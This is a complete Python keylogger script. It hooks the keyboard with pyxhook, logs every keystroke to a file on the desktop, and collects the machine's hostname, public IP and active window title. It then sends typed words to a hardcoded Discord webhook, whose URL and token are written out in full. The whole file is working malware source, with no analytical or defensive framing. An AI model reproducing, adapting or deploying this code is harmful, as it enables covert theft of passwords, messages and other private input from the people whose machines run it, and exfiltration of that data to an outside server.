import os, pyxhook, socket, time, pywinctl, requests
from discord_webhook import DiscordWebhook

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
        else:
            return None
    except Exception as ex:
        print("Error getting public IP:", ex)
        return None



hostname = socket.gethostname()
ip_address = get_public_ip()
active_window = pywinctl.getActiveWindowTitle()

username = f"[{hostname}]({ip_address})"


log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('~/Desktop/file.log')
)


cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)

if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        pass

current_word = ""
last_key_press_time = time.time()

def send_to_discord(message):
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/985547048503885904/Y86E1VAhyrX6BNmLcsExUNuvobrgjz3JebUbZdg8t2euE0OQHW8k-IEumDRGRvYe1atv', content=message, username=username + "==>" +  active_window)
    response = webhook.execute()

def OnKeyPress(event):
    global current_word, last_key_press_time
    with open(log_file, 'a') as f:
        if event.Ascii == 13:  # Enter
            if current_word:
                send_to_discord(current_word)
                current_word = ""
            f.write('\n')
            last_key_press_time = time.time()
        elif event.Ascii == 8:  # Backspace
            if current_word:
                # Send "<b>" to Discord when backspace is pressed
                send_to_discord("<b>")
                f.write("<b>")
            last_key_press_time = time.time()
        else:
            char = chr(event.Ascii)
            current_word += char
            f.write(char)
            last_key_press_time = time.time()

# Create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress

# Set the hook
new_hook.HookKeyboard()

try:
    new_hook.start()  # Start the hook
    while True:
        # Check if 2 seconds have elapsed since the last key press
        if time.time() - last_key_press_time >= 2:
            if current_word:
                # Send the current word to Discord
                send_to_discord(current_word)
                current_word = ""
        time.sleep(0.1)  # Check every 0.1 second for key press events
except KeyboardInterrupt:
    # User cancelled from the command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n {}'.format(ex)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
finally:
    new_hook.cancel()  # Stop the keylogger when exiting the loop
